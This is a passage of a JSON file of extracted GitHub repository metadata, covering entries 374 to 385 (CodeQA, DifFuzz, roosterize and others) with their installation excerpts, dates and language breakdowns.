    "374": {
        "filename": "jadecxliu_CodeQA_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/jadecxliu/CodeQA",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "CodeQA is a free-form question answering dataset for the purpose of source code comprehension: given a code snippet and a question, a textual answer is required to be generated.  \n",
                    "original_header": "CodeQA"
                },
                "confidence": 0.9423095224076811,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jadecxliu/CodeQA/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The dataset (ver. 1.0) can be downloaded from [Google Drive](https://drive.google.com/drive/folders/1i04sJNUHwMuDfMV2UfWeQG-Uv8MRw_qh?usp=sharing).  \n",
                    "original_header": "Data"
                },
                "confidence": 0.9287135663344587,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jadecxliu/CodeQA/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`cd codeBERT`\n \n",
                    "original_header": "Experiments on CodeBERT"
                },
                "confidence": 0.9280867495867754,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jadecxliu/CodeQA/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Please run the following scripts: \n`bash java_script.sh [gpu-id] [model-name]` \n`bash python_script.sh [gpu-id] [model-name]`\n \n",
                    "original_header": "Train"
                },
                "confidence": 0.9428903307734707,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jadecxliu/CodeQA/main/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "`bash java_script_test.sh [gpu-id] [model-name]` \n`bash python_script_test.sh [gpu-id] [model-name]`\n \n",
                    "original_header": "Inference"
                },
                "confidence": 0.9316541526372775,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/jadecxliu/CodeQA/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2021-09-05T07:04:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-09-18T00:58:04Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 73738
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 3536
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "375": {
        "filename": "Xscope-Tool_Results_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/Xscope-Tool/Results",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-05-23T02:19:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-15T19:49:09Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "376": {
        "filename": "maciej-bendkowski_generic-boltzmann-brain_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/maciej-bendkowski/generic-boltzmann-brain",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "Currently, no pre-compiled binaries are available.\n\n`generic-boltzmann-brain` uses an external [Python](https://www.python.org/) library\ncalled [Paganini](https://github.com/maciej-bendkowski/paganini) to do the construction\nof Boltzmann samplers. `Python` with available `paganini` are expected to be executable\nand present in the `PATH`.\n\nWe recommend using `stack` for compiling `generic-boltzmann-brain` sources.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Generic Boltzmann Brain <a href=\"https://tldrlegal.com/license/bsd-3-clause-license-(revised)\"><img alt=\"License\" src=\"https://img.shields.io/badge/license-BSD--3-orange.svg\" /></a>"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/maciej-bendkowski/generic-boltzmann-brain/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2022-01-12T15:42:42Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-05-10T19:34:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Haskell",
                    "name": "Haskell",
                    "type": "Programming_language",
                    "size": 49524
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Nix",
                    "name": "Nix",
                    "type": "Programming_language",
                    "size": 3593
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "377": {
        "filename": "leipzig_metadata-in-rcr_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/leipzig/metadata-in-rcr",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "```\n\u251c\u2500\u2500\u2500data/\n\u2502   \u251c\u2500\u2500\u2500examples/                  Examples of metadata standards\n\u2502   \u251c\u2500\u2500\u2500lens/                      Search exports for scimetric journal analysis\n\u2502   \u2514\u2500\u2500\u2500standards.tsv              Raw standards table\n\u251c\u2500\u2500\u2500src/\n\u2502   \u251c\u2500\u2500\u2500cwl/tools/                 CWL configuration to produce the timeline plot\n\u2502   \u251c\u2500\u2500\u2500manuscript/                Manuscript revision document\n\u2502   \u251c\u2500\u2500\u2500secrets/\n\u2502   \u2502   \u2514\u2500\u2500\u2500api.template.py        Replace this with api.py using your NCBI/NCBO keys\n\u2502   \u251c\u2500\u2500\u2500ontologies/                Scimetric ontology popularity analysis\n\u2502   \u251c\u2500\u2500\u2500repotutils/                Scripts for automating management of this repository\n\u2502   \u251c\u2500\u2500\u2500scimetric/                 Scimetric journal meta/rcr frequency analysis in a Jupyter Notebook\n\u2502   \u251c\u2500\u2500\u2500timeline/                  R Markdown document to produce the RCR case study timeline in the paper, incl. helper files for execution with CWL (wrapper script, Dockerfile)\n\u2502   \u251c\u2500\u2500\u2500wget2jsonld.py             Helper script to convert wget output to jsonld\n\u2502   \u2514\u2500\u2500\u2500wordcloud/                 R script to produce word cloud from cited abstracts\n\u251c\u2500\u2500\u2500LICENSE                        The LICENSE file\n\u251c\u2500\u2500\u2500README.md                      What you are looking at\n\u251c\u2500\u2500\u2500environment.osx.yaml           OSX pinned Conda depenencies\n\u251c\u2500\u2500\u2500environment.unpinned.yaml      Unpinned Conda depenencies\n\u2514\u2500\u2500\u2500ro-crate-metadata.jsonld       RO Crate config\n\u2514\u2500\u2500\u2500.binder                        Environment configuration files for usage with Binder (mybinder.org)\n``` \n",
                    "original_header": "Organization"
                },
                "confidence": 0.9999999704672295,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/leipzig/metadata-in-rcr/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "Install [cwltool](https://github.com/common-workflow-language/cwltool)\n```\npip install cwltool\ncwltool src/cwl/tools/timeline.cwl --reportfile timeline.html\n```\n \n",
                    "original_header": "How to generate the timeline for this article"
                },
                "confidence": 0.9999999230085977,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/leipzig/metadata-in-rcr/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-05-18T16:08:24Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2021-10-22T11:52:30Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TeX",
                    "name": "TeX",
                    "type": "Programming_language",
                    "size": 422490
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Jupyter Notebook",
                    "name": "Jupyter Notebook",
                    "type": "Programming_language",
                    "size": 172974
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 4133
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "R",
                    "name": "R",
                    "type": "Programming_language",
                    "size": 2745
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Common Workflow Language",
                    "name": "Common Workflow Language",
                    "type": "Programming_language",
                    "size": 2165
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 1284
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 182
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 132
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "378": {
        "filename": "yylonly_MedShare-MicroService_2024-10-04.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/yylonly/MedShare-MicroService",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* git clone https://github.com/yylonly/MedShare-MicroService\n* cd MedShare-MicroService\n \n",
                    "original_header": "Git Clone Repo"
                },
                "confidence": 0.9999998769152971,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yylonly/MedShare-MicroService/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* mvn clean package\n \n",
                    "original_header": "Build You Package (Skip this step if deploying to Kubernetes)"
                },
                "confidence": 0.947633622953459,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yylonly/MedShare-MicroService/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "* Glassfish Management http://127.0.0.1:31000 (username:admin password:glassfish)\n* MedShare will be avaible on http://127.0.0.1:30000/MicroMedShare-web/\n* username: admin \n* password: 123\n \n",
                    "original_header": "Test MedShare"
                },
                "confidence": 0.9471602366141301,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/yylonly/MedShare-MicroService/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2017-12-23T17:05:00Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2019-10-10T16:14:58Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "TSQL",
                    "name": "TSQL",
                    "type": "Programming_language",
                    "size": 5843849
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 217114
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 16706
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Dockerfile",
                    "name": "Dockerfile",
                    "type": "Programming_language",
                    "size": 3489
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 966
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 400
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "379": {
        "filename": "isstac_diffuzz_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/isstac/diffuzz",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "We provide a script \"setup.sh\" to simply build everything. But please read first the explanations below. \n\nThe folder *tool* contains 3 subfolders:\n\n* *afl-2.51b-wca*: KelinciWCA, and hence also DifFuzz, is using [AFL](http://lcamtuf.coredump.cx/afl/) as the underlying fuzzing engine. KelinciWCA leverages a server-client architecture to make AFL applicable to Java applications, please refer to the Kelinci [poster-paper](https://dl.acm.org/citation.cfm?id=3138820) for more details. In order to make it easy for the users, we provide our complete modified AFL variant in this folder. Note that we only modified the file *afl-fuzz.c*. For our experiments we have used [afl-2.51b](http://lcamtuf.coredump.cx/afl/releases/?O=D). Please build AFL by following their instructions. Although the `make` command should be enough.\n\n* *fuzzerside*: This folder includes the *interface* program to connect the *Kelinci server* to the AFL fuzzer. Simply use `make` to compile the interface.c file. If there is an error, you will have to modify the Makefile according to your system setup.\n\n* *instrumentor*: This folder includes the *Kelinci server* and the *instrumentor* written in Java. The instrumentor is used to instrument the Java bytecode, which is necessary to add the coverage reporting and other metric collecting for the fuzzing. The Kelinci server handles requests from AFL to execute a mutated input on the application. Both are included in the same Gradle project. Therefore, you can simply use `gradle build` to build them.\n\nAs already mentioned, we have provided a script to build everything. Please execute `tool/setup.sh` to trigger that. Note that depending on your execution environment, you may want to modify this script. We tested our scripts on a Ubuntu Ubuntu 18.04.1 LTS machine.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "DifFuzz: Differential Fuzzing for Side-Channel Analysis",
                        "Tool"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/isstac/diffuzz/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In general, you will have to follow six steps in order to apply DifFuzz for side-channel analysis: \n3. **Instrument the bytecode**: Assuming that your bytecode is in the `bin` folder, the command for instrumentation could look like: `java -cp [..]/diffuzz/tool/instrumentor/build/libs/kelinci.jar edu.cmu.sv.kelinci.instrumentor.Instrumentor -i bin -o bin-instr -skipmain` \n4. **Starting the Kelinci server**: Assuming that the fuzzing driver class is called `Driver`, the command for starting the Kelinci server could look like: `java -cp bin-instr edu.cmu.sv.kelinci.Kelinci Driver @@` \n5. **Start fuzzing by starting the modified AFL**: Assuming that you have installed AFL correctly, the command for starting AFL could be like this: `afl-fuzz -i in_dir -o fuzzer-out -c userdefined -S afl -t 999999999 [..]/diffuzz/tool/fuzzerside/interface @@`.  Depending on your execution environment, you might want to add flags like: `AFL_I_DONT_CARE_ABOUT_MISSING_CRASHES=1` or `AFL_SKIP_CPUFREQ=1`. The timeout parameter `-t` is set to a high value, just because that we want to kill AFL process ourself. \n",
                    "original_header": "General Execution Instructions"
                },
                "confidence": 0.9955445224707187,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/isstac/diffuzz/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "The folder *evaluation* contains all our evaluation subjects. After having DifFuzz installed, you can run the script *prepare.sh* to build and instrument all subjects. \nThe subjects *themis_pac4j_** and *themis_tomcat_** need a running database connection. In our experiments we used *h2* databases. Please follow their [instructions](https://www.h2database.com/html/main.html) for setup and maybe consider our helping [notes](evaluation/database_resources/database_notes.txt). Our fuzzing drivers for the *themis_pac4j_** subjects assume a connection with `url=\"jdbc:h2:~/pac4j-fuzz\"`, `user=\"sa\"` and `password=\"\"`. Furthermore they assume an existing table `users (id INT, username varchar(255), password varchar(255))`. Our fuzzing drivers for the *themis_tomcat_** subjects assume a connection with `url=\"jdbc:h2:~/tomcat\"`, `user=\"sa\"` `password=\"\"`, and an existing table `users (user_name varchar(255), user_pass varchar(255))`. Please make sure that your environment matches these requirements or adjust the drivers/subjects. \n",
                    "original_header": "Evaluation"
                },
                "confidence": 0.9796054781723333,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/isstac/diffuzz/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "In each subject folder you find two scripts: `01_startKelinciServer.sh` and `02_startFuzzer.sh`. They show how to start the Kelinci server and the modified AFL for this specific subject. You can use them directly to start the analysis (we recommend starting them in multiple terminal windows like mentioned above). Note that the execution order is *crucial*: first start the Kelinci server, and afterwards start the modified AFL! These scripts do not use any timeout, i.e. in general they will run forever. You can stop the scripts by using CTRL-C. Be aware that it is necessary to start the scripts within the specific subject folder, otherwise the paths used in the scripts won't match. Feel free to reuse our scripts to build your own execution environment, e.g. to stop the analysis after a certain timebound or run multiple instances of the same analysis repeatedly.\n \n",
                    "original_header": "Scripts"
                },
                "confidence": 0.9999771052843415,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/isstac/diffuzz/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2018-11-16T17:48:23Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-10T08:59:14Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Java",
                    "name": "Java",
                    "type": "Programming_language",
                    "size": 23890878
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C",
                    "name": "C",
                    "type": "Programming_language",
                    "size": 407485
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "SQLPL",
                    "name": "SQLPL",
                    "type": "Programming_language",
                    "size": 224564
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 116701
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "HTML",
                    "name": "HTML",
                    "type": "Programming_language",
                    "size": 90071
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "XSLT",
                    "name": "XSLT",
                    "type": "Programming_language",
                    "size": 32167
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "C++",
                    "name": "C++",
                    "type": "Programming_language",
                    "size": 19563
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 13644
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 4014
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Batchfile",
                    "name": "Batchfile",
                    "type": "Programming_language",
                    "size": 2978
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "PLpgSQL",
                    "name": "PLpgSQL",
                    "type": "Programming_language",
                    "size": 172
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "CSS",
                    "name": "CSS",
                    "type": "Programming_language",
                    "size": 133
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "JavaScript",
                    "name": "JavaScript",
                    "type": "Programming_language",
                    "size": 20
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "380": {
        "filename": "iitpvisionlab_heterogeneous-ai-system-simulator_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/iitpvisionlab/heterogeneous-ai-system-simulator",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2022-02-10T11:30:10Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-18T09:18:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 19794
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "381": {
        "filename": "maisieb01_Cognitive_SLR_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/maisieb01/Cognitive_SLR",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "On how Cognitive Computing will plan your next systematic review\n \n",
                    "original_header": "Cognitive_SLR"
                },
                "confidence": 0.9911809034520921,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/maisieb01/Cognitive_SLR/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-10-15T23:34:37Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2020-12-16T14:24:03Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "382": {
        "filename": "bayesgroup_code_transformers_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/bayesgroup/code_transformers",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2021-03-22T16:58:38Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-04T16:55:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 546256
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 15534
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "383": {
        "filename": "aserg-ufmg_sbsi2016-data_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/aserg-ufmg/sbsi2016-data",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": "No installation instructions found.",
        "date_created": [
            {
                "result": {
                    "value": "2016-04-05T00:27:43Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2016-10-13T18:25:07Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": "No programming languages found."
    },
    "384": {
        "filename": "FSoft-AI4Code_CodeSync-Tool_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/FSoft-AI4Code/DocChecker",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "1. (Optional) Creating conda environment\n\n```bash\nconda create -n docchecker python=3.8\nconda activate docchecker\n```\n\n2. Install from [PyPI](https://pypi.org/project/docchecker/):\n```bash\npip install docchecker\n```\n    \n3. Alternatively, build DocChecker from source:\n\n```bash\ngit clone https://github.com/FSoft-AI4Code/DocChecker.git\ncd DocChecker\npip install -r requirements.txt .\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation Guide"
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FSoft-AI4Code/CodeSync-Tool/main/README.md"
            },
            {
                "result": {
                    "value": "Setup environment and install dependencies for pre-training.\n```bash\ncd ./DocChecker\npip -r install requirements.txt\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation for Pre-training",
                    "parent_header": [
                        "Getting Started",
                        "Pre-training Pipeline"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/FSoft-AI4Code/CodeSync-Tool/main/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2023-05-08T20:39:59Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-06-25T23:16:52Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 116252
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "385": {
        "filename": "EngineeringSoftware_roosterize_2024-10-03.json",
        "code_repository": [
            {
                "result": {
                    "value": "https://github.com/EngineeringSoftware/roosterize",
                    "type": "Url"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "installation_instructions": [
            {
                "result": {
                    "value": "You can install Roosterize from source code by cloning this GitHub\nrepository and setting up the dependencies following steps 1 & 2.\n(Alternatively, you can download the a [binary\ndistribution](https://github.com/EngineeringSoftware/roosterize/releases)\nwhich already contains the Python dependencies, and then you only need\nstep 1.)\n\n```\ngit clone https://github.com/EngineeringSoftware/roosterize.git\ncd roosterize\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation",
                    "parent_header": [
                        "Roosterize"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/roosterize/master/README.md"
            },
            {
                "result": {
                    "value": "We strongly recommend installing the required versions of OCaml, Coq,\nand SerAPI via the [OPAM package manager](https://opam.ocaml.org),\nversion 2.0.7 or later.\n\nTo set up the OPAM-based OCaml environment, use:\n```\nopam switch create roosterize 4.07.1\nopam switch roosterize\neval $(opam env)\n```\nThen, install Coq and SerAPI, pinning them to avoid unintended upgrades:\n```\nopam update\nopam pin add coq 8.10.2\nopam pin add coq-serapi 8.10.0+0.7.1\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "1. Installation of OCaml, Coq, and SerAPI",
                    "parent_header": [
                        "Roosterize",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/roosterize/master/README.md"
            },
            {
                "result": {
                    "value": "We strongly recommend installing the required versions of Python and\nPyTorch using [Conda](https://docs.conda.io/en/latest/miniconda.html).\n\nTo set up the Conda environment, use one of the following command\nsuitable for your operating system and whether you want to use it on a\nCPU or GPU.\n\n- Linux, CPU:\n```\nconda env create --name roosterize --file conda-envs/cpu.yml\n```\n\n- Linux, GPU w/ CUDA 10.0:\n```\nconda env create --name roosterize --file conda-envs/gpu-cuda10.yml\n```\n\n- Linux, GPU w/ CUDA 9.0:\n```\nconda env create --name roosterize --file conda-envs/gpu-cuda9.yml\n```\n\n- Mac, CPU:\n```\nconda env create --name roosterize --file conda-envs/mac-cpu.yml\n```\n\nFinally, activate the Conda environment before using Roosterize:\n```\nconda activate roosterize\n```\n",
                    "type": "Text_excerpt",
                    "original_header": "2. Installation of PyTorch and Python libraries",
                    "parent_header": [
                        "Roosterize",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/roosterize/master/README.md"
            },
            {
                "result": {
                    "value": "Next, you need to obtain a pre-trained model that capture naming\nconventions.  The default pre-trained model, which was trained using\nour [corpus][math-comp-corpus] and follows the conventions used in the\n[Mathematical Components][math-comp-website] family of projects, can\nbe obtained by running the command:\n\n```\n./bin/roosterize download_global_model\n```\n\nThe model will be downloaded to `$HOME/.roosterize/`. To use a\ndifferent model (that we [released][latest-release] or you trained),\nsimply put it in `$HOME/.roosterize/`.\n",
                    "type": "Text_excerpt",
                    "original_header": "Installation of trained models",
                    "parent_header": [
                        "Roosterize",
                        "Installation"
                    ]
                },
                "confidence": 1,
                "technique": "header_analysis",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/roosterize/master/README.md"
            },
            {
                "result": {
                    "type": "Text_excerpt",
                    "value": "\n[arxiv-paper]: https://arxiv.org/abs/2004.07761\n[math-comp-corpus]: https://github.com/EngineeringSoftware/math-comp-corpus\n[math-comp-website]: https://math-comp.github.io\n \n"
                },
                "confidence": 0.999999744968609,
                "technique": "supervised_classification",
                "source": "https://raw.githubusercontent.com/EngineeringSoftware/roosterize/master/README.md"
            }
        ],
        "date_created": [
            {
                "result": {
                    "value": "2020-04-19T01:04:11Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "date_updated": [
            {
                "result": {
                    "value": "2024-01-26T20:13:21Z",
                    "type": "Date"
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ],
        "programming_languages": [
            {
                "result": {
                    "value": "Python",
                    "name": "Python",
                    "type": "Programming_language",
                    "size": 896085
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Shell",
                    "name": "Shell",
                    "type": "Programming_language",
                    "size": 5022
                },
                "confidence": 1,
                "technique": "GitHub_API"
            },
            {
                "result": {
                    "value": "Makefile",
                    "name": "Makefile",
                    "type": "Programming_language",
                    "size": 613
                },
                "confidence": 1,
                "technique": "GitHub_API"
            }
        ]
    },
    "386": {
